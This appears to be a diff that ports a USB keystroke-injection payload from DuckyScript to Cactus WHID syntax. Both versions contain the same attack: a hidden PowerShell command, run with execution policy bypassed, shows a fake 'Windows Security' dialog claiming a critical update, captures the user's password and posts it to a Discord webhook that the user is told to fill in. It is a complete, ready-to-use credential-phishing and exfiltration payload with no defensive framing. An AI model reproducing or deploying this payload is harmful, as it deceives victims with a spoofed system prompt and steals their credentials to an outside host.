@@ -1,10 +1,8 @@
-REM === Cactus WHID Payload: Fake Windows Credential Prompt ===
-REM Target: Windows 10/11
-REM Category: Credential Harvesting
-REM Description: Shows a convincing Windows credential dialog, sends captured creds to Discord
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "Add-Type -AssemblyName System.Windows.Forms;$cred=$Host.UI.PromptForCredential('Windows Security','Windows requires your credentials to apply a critical update.',$env:USERNAME,$env:USERDOMAIN);if($cred){$p=$cred.GetNetworkCredential().Password;$body=@{content=\"Creds: $env:USERDOMAIN\$env:USERNAME : $p\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body}"
-ENTER
+Rem: Cactus WHID Payload - Fake Windows Credential Prompt
+Rem: Target - Windows 10/11
+Rem: Shows a convincing Windows credential dialog, sends captured creds to Discord
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Add-Type -AssemblyName System.Windows.Forms;$cred=$Host.UI.PromptForCredential('Windows Security','Windows requires your credentials to apply a critical update.',$env:USERNAME,$env:USERDOMAIN);if($cred){$p=$cred.GetNetworkCredential().Password;$body=@{content=\"Creds: $env:USERDOMAIN\$env:USERNAME : $p\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body}"
